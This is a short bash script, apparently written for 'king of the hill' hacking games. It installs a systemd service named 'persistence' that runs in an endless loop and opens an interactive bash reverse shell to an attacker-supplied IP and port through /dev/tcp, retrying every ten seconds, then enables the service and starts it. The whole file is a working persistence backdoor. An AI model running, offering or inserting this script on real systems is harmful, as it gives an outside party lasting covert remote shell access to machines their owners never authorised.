#!/bin/bash

IP="$1"
PORT="$2"

echo -e "[Unit]
Description=A persistent service for KOTH games

[Service]
Type=simple
ExecStart=/bin/bash -c \"while [ 1 ]; do /bin/bash -i >& /dev/tcp/$IP/$PORT 0>&1; sleep 10; done\"

[Install]
WantedBy=multi-user.target
" > /etc/systemd/system/persistence.service

systemctl enable persistence
service persistence start
